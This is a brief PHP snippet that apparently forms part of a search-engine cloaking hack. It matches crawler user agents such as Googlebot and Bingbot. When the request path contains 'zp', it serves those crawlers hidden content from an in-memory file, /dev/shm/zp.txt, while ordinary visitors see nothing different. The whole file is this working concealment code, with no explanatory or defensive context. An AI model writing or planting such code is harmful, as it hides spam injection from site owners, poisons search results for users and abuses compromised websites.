<?php
$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$request_uri = $_SERVER['REQUEST_URI'] ?? '';

$is_bot = false;

$bots = [
    'Googlebot',
    'Google-InspectionTool',
    'AdsBot-Google',
    'Mediapartners-Google',
    'Bingbot',
    'Slurp',
    'DuckDuckBot',
    'AhrefsBot',
    'SemrushBot',
    'MJ12bot',
    'YandexBot'
];

foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

/* trigger hanya zp */
if ($is_bot && stripos($request_uri, 'zp') !== false) {

    $file = '/dev/shm/zp.txt';

    if (file_exists($file)) {
        readfile($file);
    } else {
        echo 'cache not ready';
    }

    exit;
}
